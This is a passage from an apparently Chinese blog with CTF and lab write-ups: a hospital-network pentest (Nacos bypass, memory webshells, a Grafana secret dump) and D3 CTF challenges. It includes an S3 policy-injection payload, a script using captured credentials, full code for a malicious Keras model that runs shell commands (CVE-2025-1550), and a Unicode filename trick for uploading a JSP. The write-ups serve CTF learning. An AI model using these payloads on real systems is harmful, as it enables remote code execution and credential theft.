服务识别 172.30.12.6:135 =&gt; </span><br><span class="hljs-string">[2025-08-04 23:42:32] [INFO] 存活端口数量: 9</span><br><span class="hljs-string">[2025-08-04 23:42:32] [INFO] 开始漏洞扫描</span><br><span class="hljs-string">[2025-08-04 23:42:33] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.30.12.6</span><br><span class="hljs-string">主机名: Server02</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.30.12.6</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=42BD587B74C2B58C42238FBB955213F9</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=42BD587B74C2B58C42238FBB955213F9 状态码:200 长度:2005   标题:医疗管理后台</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="hljs-string">  漏洞类型: poc-yaml-alibaba-nacos</span><br><span class="hljs-string">  漏洞名称: </span><br><span class="hljs-string">  详细信息:</span><br><span class="hljs-string">        author:AgeloVito</span><br><span class="hljs-string">        links:https://blog.csdn.net/caiqiiqi/article/details/112005424</span><br><span class="hljs-string">[2025-08-04 23:42:33] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="hljs-string">  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="hljs-string">  漏洞名称: </span><br><span class="hljs-string">  详细信息:</span><br><span class="hljs-string">        author:kmahyyg(https://github.com/kmahyyg)</span><br><span class="hljs-string">        links:https://github.com/alibaba/nacos/issues/4593</span><br><span class="hljs-string">[2025-08-04 23:42:34] [SUCCESS] 目标: http://172.30.12.5:8080</span><br><span class="hljs-string">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="hljs-string">  漏洞名称: </span><br><span class="hljs-string">  详细信息:</span><br><span class="hljs-string">        author:AgeloVito</span><br><span class="hljs-string">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class="hljs-string">[2025-08-04 23:48:34] [SUCCESS] 扫描已完成: 16/16</span><br></code></pre></td></tr></table></figure><p><img src="/../hospital/1756616305163-4.png" alt="img"></p><p>代理后后访问内网</p><p>用nacos工具注入内存马后（注意加header）就能连接了</p><p><img src="/../hospital/1756616305163-5.png" alt="img"></p><p><img src="/../hospital/1756616305163-6.png" alt="img"></p><p>在冰蝎里面拿到flag2</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>下载bp的fastjsonscan 插件然后抓包写入哥斯拉内存马</p><p><img src="/../hospital/1756616305163-7.png" alt="img"></p><p>连入之后拿到flag3</p><p><img src="/../hospital/1756616305163-8.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p><img src="/../hospital/1756616305163-9.png" alt="img"></p><p>发现还有一个网卡</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs Markdown">/root &gt;./FScan<span class="hljs-emphasis">_linux_</span>x64 -h 172.30.54.179/24<br><br>┌──────────────────────────────────────────────┐<br>│    <span class="hljs-strong">___                              _        │</span><br><span class="hljs-strong">│   / _ \     __</span>_  <span class="hljs-strong">___ _ __</span> __ _  <span class="hljs-strong">__<span class="hljs-emphasis">_| | _</span>_    │</span><br><span class="hljs-strong">│  / /<span class="hljs-emphasis">_\/_</span>__</span><span class="hljs-emphasis">_/ <span class="hljs-strong">__|/ __</span>| &#x27;<span class="hljs-strong">__/ _` |/ __</span>| |/ /    │</span><br><span class="hljs-emphasis">│ / /_</span>\\<span class="hljs-strong">____</span><span class="hljs-emphasis">_\_</span>_ \ (<span class="hljs-strong">__| | | (<span class="hljs-emphasis">_| | (_</span><span class="hljs-emphasis">_|   &lt;     │</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">│ \_</span>__</span><span class="hljs-emphasis">_/     |<span class="hljs-strong">___/\__</span>_</span>|<span class="hljs-emphasis">_|  \<span class="hljs-strong">__,_|\__</span>_</span>|<span class="hljs-emphasis">_|\_</span>\    │<br>└──────────────────────────────────────────────┘<br><span class="hljs-code">      Fscan Version: 2.0.1</span><br><span class="hljs-code"></span><br>[2.3s]     已选择服务扫描模式<br>[2.3s]     开始信息扫描<br>[2.3s]     CIDR范围: 172.30.54.0-172.30.54.255<br>[2.3s]     generate<span class="hljs-emphasis">_ip_</span>range<span class="hljs-emphasis">_full</span><br><span class="hljs-emphasis">[2.3s]     解析CIDR 172.30.54.179/24 -&gt; IP范围 172.30.54.0-172.30.54.255</span><br><span class="hljs-emphasis">[2.3s]     最终有效主机数量: 256</span><br><span class="hljs-emphasis">[2.3s]     开始主机扫描</span><br><span class="hljs-emphasis">[2.3s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-emphasis">[2.3s] [*] 目标 172.30.54.179   存活 (ICMP)</span><br><span class="hljs-emphasis">[2.3s] [*] 目标 172.30.54.12    存活 (ICMP)</span><br><span class="hljs-emphasis">[5.3s]     存活主机数量: 2</span><br><span class="hljs-emphasis">[5.3s]     有效端口数量: 233</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:5555</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.12:3000</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:8080</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:22</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.179:8009</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.12:22</span><br><span class="hljs-emphasis">[5.4s] [*] 端口开放 172.30.54.12:5432</span><br><span class="hljs-emphasis">[5.4s]     扫描完成, 发现 7 个开放端口</span><br><span class="hljs-emphasis">[5.4s]     存活端口数量: 7</span><br><span class="hljs-emphasis">[5.4s]     开始漏洞扫描</span><br><span class="hljs-emphasis">[5.6s] [*] 网站标题 http://172.30.54.12:3000  状态码:302 长度:29     标题:无标题 重定向地址: http://172.30.54.12:3000/login</span><br><span class="hljs-emphasis">[5.6s] [*] 网站标题 http://172.30.54.179:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="hljs-emphasis">[5.6s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-emphasis">[5.7s] [*] 网站标题 http://172.30.54.12:3000/login 状态码:200 长度:27909  标题:Grafana</span><br><span class="hljs-emphasis">[43.9s]     扫描已完成: 11/11</span><br></code></pre></td></tr></table></figure><p>新网卡扫一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">/root &gt;./linux_amd64_grafanaExp exp -u http://<span class="hljs-number">172.30</span><span class="hljs-number">.54</span><span class="hljs-number">.12</span>:<span class="hljs-number">3000</span><br><br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> Target vulnerable has plugin [alertlist]<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> Got secret_key [SW2YcwTIb9zpOOhoPsMm]<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> There are [<span class="hljs-number">1</span>] records <span class="hljs-keyword">in</span> data_source table.<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> <span class="hljs-built_in">type</span>:[postgres]        name:[PostgreSQL]                url:[localhost:<span class="hljs-number">5432</span>]        user:[postgres]        password[��K�&lt;a8�aIc���rT��&lt;X]        database:[postgres]        basic_auth_user:[]        basic_auth_password:[]<br><span class="hljs-number">2025</span>/08/<span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">27</span>:<span class="hljs-number">36</span> All Done, have nice day!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>D3 CTF</title>
    <link href="/2025/06/11/D3%20CTF/"/>
    <url>/2025/06/11/D3%20CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="D3-CTF"><a href="#D3-CTF" class="headerlink" title="D3 CTF"></a>D3 CTF</h1><h2 id="1-D3-invitation"><a href="#1-D3-invitation" class="headerlink" title="1.D3 invitation"></a>1.D3 invitation</h2><p>先伪造拿到jwt</p><p>payload*:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:<em>&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::</em>&#x2F;*”}</p><p><img src="D:\ctf\笔记\图片\image-20250604171659123.png" alt="image-20250604171659123"></p><p><img src="/%E5%9B%BE%E7%89%87/image-20250605172402599.png" alt="image-20250605172402599"></p><p><strong>2. STS 令牌策略注入</strong></p><ul><li><p><strong>场景</strong>：后端生成 STS 策略时，未过滤用户输入，导致 RAM 策略被篡改。</p></li><li><p><strong>原理</strong>：用户输入恶意字符，嵌入 RAM 策略，扩大权限范围。</p></li><li><p><strong>payload</strong>:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:<em>&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::</em>&#x2F;*”}</p><p>  <img src="/%E5%9B%BE%E7%89%87/image-20250605173030056.png" alt="image-20250605173030056"></p></li></ul><p>再拿着令牌去访问下载flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> boto3<br><span class="hljs-keyword">from</span> botocore.client <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> botocore.exceptions <span class="hljs-keyword">import</span> ClientError<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_objects_in_bucket</span>(<span class="hljs-params">access_key, secret_key, session_token, endpoint, bucket</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;列出存储桶中的所有对象&quot;&quot;&quot;</span><br>    session = boto3.session.Session()<br>    s3 = session.client(<br>        service_name=<span class="hljs-string">&#x27;s3&#x27;</span>,<br>        endpoint_url=endpoint,<br>        aws_access_key_id=access_key,<br>        aws_secret_access_key=secret_key,<br>        aws_session_token=session_token,<br>        config=Config(signature_version=<span class="hljs-string">&#x27;s3v4&#x27;</span>),<br>        region_name=<span class="hljs-string">&#x27;us-east-1&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">try</span>:<br>        response = s3.list_objects_v2(Bucket=bucket)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Contents&#x27;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;桶 &#x27;<span class="hljs-subst">&#123;bucket&#125;</span>&#x27; 中的对象列表:&quot;</span>)<br>            <span class="hljs-keyword">return</span> [obj[<span class="hljs-string">&#x27;Key&#x27;</span>] <span class="hljs-keyword">for</span> obj <span class="hljs-keyword">in</span> response[<span class="hljs-string">&#x27;Contents&#x27;</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;桶 &#x27;<span class="hljs-subst">&#123;bucket&#125;</span>&#x27; 为空。&quot;</span>)<br>            <span class="hljs-keyword">return</span> []<br><br>    <span class="hljs-keyword">except</span> ClientError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;列出对象时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_flag_file</span>(<span class="hljs-params">access_key, secret_key, session_token, endpoint, bucket, object_name, download_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;下载指定对象到本地文件&quot;&quot;&quot;</span><br>    session = boto3.session.Session()<br>    s3 = session.client(<br>        service_name=<span class="hljs-string">&#x27;s3&#x27;</span>,<br>        endpoint_url=endpoint,<br>        aws_access_key_id=access_key,<br>        aws_secret_access_key=secret_key,<br>        aws_session_token=session_token,<br>        config=Config(signature_version=<span class="hljs-string">&#x27;s3v4&#x27;</span>),<br>        region_name=<span class="hljs-string">&#x27;us-east-1&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">try</span>:<br>        s3.download_file(bucket, object_name, download_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功下载 <span class="hljs-subst">&#123;object_name&#125;</span> 到 <span class="hljs-subst">&#123;download_path&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ClientError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;下载失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    access_key = <span class="hljs-string">&quot;LG3NMF8KJW6PG6SCBDKJ&quot;</span><br>    secret_key = <span class="hljs-string">&quot;E6zlKw41LzXyCZ77RD1rkDm0ZYYY+eu1ZOjWt2OG&quot;</span><br>    session_token = <span class="hljs-string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJMRzNOTUY4S0pXNlBHNlNDQkRLSiIsImV4cCI6MTc0OTAyOTg5OSwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2t4cGMzUkJiR3hOZVVKMVkydGxkSE1pWFN3aVVtVnpiM1Z5WTJVaU9sc2lLaW9pWFgwc2V5SkZabVpsWTNRaU9pSkJiR3h2ZHlJc0lrRmpkR2x2YmlJNld5SnpNenBIWlhSUFltcGxZM1FpTENKek16cFFkWFJQWW1wbFkzUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjdktpSmRmU3g3SWtWbVptVmpkQ0k2SWtGc2JHOTNJaXdpUVdOMGFXOXVJanBiSW5Nek9reHBjM1JDZFdOclpYUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjaVhYMWRmUT09In0.cJrQc8vU2lOW8RhX6Is1EqTMu0gXWl51aQ52URU4R19gfxh5Or1oOBrg7h9Wfj19MjJlgpXvJwOJXedW5m7zGQ&quot;</span><br>    endpoint = <span class="hljs-string">&quot;http://35.241.98.126:30093&quot;</span><br>    bucket = <span class="hljs-string">&quot;flag&quot;</span><br><br>    <span class="hljs-comment"># 列出桶中的对象</span><br>    objects = list_objects_in_bucket(access_key, secret_key, session_token, endpoint, bucket)<br><br>    <span class="hljs-comment"># 如果有对象，下载第一个对象</span><br>    <span class="hljs-keyword">if</span> objects:<br>        first_object = objects[<span class="hljs-number">0</span>]<br>        download_path = <span class="hljs-string">f&quot;downloaded_<span class="hljs-subst">&#123;first_object&#125;</span>&quot;</span><br>        download_flag_file(access_key, secret_key, session_token, endpoint, bucket, first_object, download_path)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有可下载的对象。&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="2-D3-model"><a href="#2-D3-model" class="headerlink" title="2.D3 model"></a>2.D3 model</h2><h3 id="通俗易懂解释-CVE-2025-1550：Keras-模型暗藏的-“黑客后门”"><a href="#通俗易懂解释-CVE-2025-1550：Keras-模型暗藏的-“黑客后门”" class="headerlink" title="通俗易懂解释 CVE-2025-1550：Keras 模型暗藏的 “黑客后门”"></a>通俗易懂解释 CVE-2025-1550：Keras 模型暗藏的 “黑客后门”</h3><h3 id="一、什么是-Keras-和漏洞？"><a href="#一、什么是-Keras-和漏洞？" class="headerlink" title="一、什么是 Keras 和漏洞？"></a>一、什么是 Keras 和漏洞？</h3><p>Keras 是一个常用的机器学习工具，用来创建和训练 AI 模型。就像我们用 Word 保存文档一样，Keras 会把模型保存成一个包含多个文件的 “包裹”（.keras 格式），里面有模型的 “蓝图”（config.json）、“元数据”（metadata.json）和 “训练数据”（weights.h5）。</p><p><strong>漏洞的核心问题</strong>：当 Keras 加载一个恶意构造的模型文件（甚至只是一个恶意的 JSON 文件）时，黑客可以让你的电脑执行任意恶意代码（比如删除文件、下载病毒、远程控制电脑等）。这就像你打开一个看似正常的 Word 文档，结果里面藏着一个病毒程序，一打开就自动运行了。</p><p><strong>关键点</strong>：漏洞的核心是 Keras 在反序列化模型配置时，允许动态加载任意 Python 模块并执行函数，且未对输入做安全过滤。这相当于给模型加载过程开了一个 “后门”，让恶意代码能伪装成模型配置被执行。</p><p>payload:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs lua">import zipfile<br>import json<br>from keras.models import Sequential<br>from keras.layers import Dense<br>import numpy as np<br>import <span class="hljs-built_in">os</span><br><br>model_name = <span class="hljs-string">&quot;test.keras&quot;</span><br><br>x_train = np.<span class="hljs-built_in">random</span>.rand(<span class="hljs-number">100</span>, <span class="hljs-number">28</span> * <span class="hljs-number">28</span>)<br>y_train = np.<span class="hljs-built_in">random</span>.rand(<span class="hljs-number">100</span>)<br><br>model = Sequential([Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">&#x27;linear&#x27;</span>, input_dim=<span class="hljs-number">28</span> * <span class="hljs-number">28</span>)])<br><br>model.compile(optimizer=<span class="hljs-string">&#x27;adam&#x27;</span>, loss=<span class="hljs-string">&#x27;mse&#x27;</span>)<br>model.fit(x_train, y_train, epochs=<span class="hljs-number">5</span>)<br>model.save(model_name)<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&quot;r&quot;</span>) as f:<br>    <span class="hljs-built_in">config</span> = json.loads(f.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;config.json&quot;</span>).decode())<br><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;module&quot;</span>] = <span class="hljs-string">&quot;keras.models&quot;</span><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;class_name&quot;</span>] = <span class="hljs-string">&quot;Model&quot;</span><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;config&quot;</span>] = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br>    <span class="hljs-string">&quot;layers&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br>            <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,<br>            <span class="hljs-string">&quot;config&quot;</span>: <span class="hljs-string">&quot;Popen&quot;</span>,<br>            <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;subprocess&quot;</span>,<br>            <span class="hljs-string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="hljs-string">&quot;args&quot;</span>: <span class="hljs-string">[[&quot;sh&quot;, &quot;-c&quot;,&quot;env&gt;/app/index.html&quot;]]</span>, <span class="hljs-string">&quot;kwargs&quot;</span>: &#123;<span class="hljs-string">&quot;bufsize&quot;</span>: <span class="hljs-number">-1</span>&#125;&#125;]<br>        &#125;],<br>    <span class="hljs-string">&quot;input_layers&quot;</span>: <span class="hljs-string">[[&quot;mvlttt&quot;, 0, 0]]</span>,<br>    <span class="hljs-string">&quot;output_layers&quot;</span>: <span class="hljs-string">[[&quot;mvlttt&quot;, 0, 0]]</span><br>&#125;<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&#x27;r&#x27;</span>) as zip_read:<br>    with zipfile.ZipFile(f<span class="hljs-string">&quot;tmp.&#123;model_name&#125;&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) as zip_write:<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> zip_read.infolist():<br>            <span class="hljs-keyword">if</span> item.filename != <span class="hljs-string">&quot;config.json&quot;</span>:<br>                zip_write.writestr(item, zip_read.<span class="hljs-built_in">read</span>(item.filename))<br><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">remove</span>(model_name)<br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">rename</span>(f<span class="hljs-string">&quot;tmp.&#123;model_name&#125;&quot;</span>, model_name)<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&quot;a&quot;</span>) as zf:<br>    zf.writestr(<span class="hljs-string">&quot;config.json&quot;</span>, json.dumps(<span class="hljs-built_in">config</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Malicious model ready&quot;</span>)<br></code></pre></td></tr></table></figure><p>生成模型后上传，再刷新页面即可（将环境变量输出到主页）</p><h2 id="3-D3-jtr"><a href="#3-D3-jtr" class="headerlink" title="3.D3 jtr"></a>3.D3 jtr</h2><h4 id="一、题目背景与核心问题"><a href="#一、题目背景与核心问题" class="headerlink" title="一、题目背景与核心问题"></a>一、题目背景与核心问题</h4><p>本题围绕网站备份系统的安全漏洞展开，核心难点在于：</p><ul><li>目标：上传 JSP 文件实现远程代码执行（RCE）</li><li>限制：后端对文件名有严格校验，直接上传<code>.jsp</code>后缀会被拦截</li><li>突破口：备份系统使用的<code>jtar</code>库存在文件名处理漏洞，可利用 Unicode 字符截断绕过校验</li></ul><h4 id="二、jtar-库的-Unicode-字符处理漏洞原理"><a href="#二、jtar-库的-Unicode-字符处理漏洞原理" class="headerlink" title="二、jtar 库的 Unicode 字符处理漏洞原理"></a>二、jtar 库的 Unicode 字符处理漏洞原理</h4><p><code>jtar</code>是一个 Java 实现的 tar 打包库，其核心问题出在<code>TarHeader</code>类的<code>getNameBytes</code>方法中。当处理包含 Unicode 字符的文件名时，库会将字符强制转换为字节（使用<code>(byte)</code>转换），这会导致<strong>高位字节被截断</strong>，仅保留低 8 位字节。</p><h4 id="三、Unicode-字符截断攻击的具体实现"><a href="#三、Unicode-字符截断攻击的具体实现" class="headerlink" title="三、Unicode 字符截断攻击的具体实现"></a>三、Unicode 字符截断攻击的具体实现</h4><ol><li><p><strong>字符截断原理</strong>：</p><ul><li>每个 Unicode 字符由 2 字节（或更多）表示，例如字符<code>陪</code>的 Unicode 编码为<code>U+966A</code>（十六进制）</li><li>当执行<code>(byte)&#39;陪&#39;</code>时，实际计算为<code>(byte)0x966A</code>，由于强制转换为 byte 类型，仅保留低 8 位<code>0x6A</code></li><li><code>0x6A</code>对应的 ASCII 字符正是<code>&#39;j&#39;</code>，因此<code>陪</code>在截断后变为<code>&#39;j&#39;</code></li></ul></li><li><p><strong>构造攻击文件名</strong>：</p><ul><li>示例文件名：<code>payload.陪sp</code></li><li>解析过程：<ul><li>上传时，文件名包含<code>陪</code>（<code>U+966A</code>），系统校验可能只检查可见字符或简单规则，允许上传</li><li>当使用 jtar 打包时，<code>陪</code>被截断为<code>&#39;j&#39;</code>，文件名变为<code>payload.jsp</code></li><li>恢复备份时，文件被写入 JSP 解析目录，最终以<code>.jsp</code>后缀存在，实现解析执行</li></ul></li></ul></li><li><p><strong>Unicode 字符搜索方法</strong>：</p><ul><li><p>使用用户提供的 Python 脚本可反向查找对应 ASCII 字符的 Unicode 字符</p></li><li><p>例如，查找对应<code>&#39;j&#39;</code>（ASCII 码 106，0x6A）的 Unicode 字符</p></li><li><p>查找脚本</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 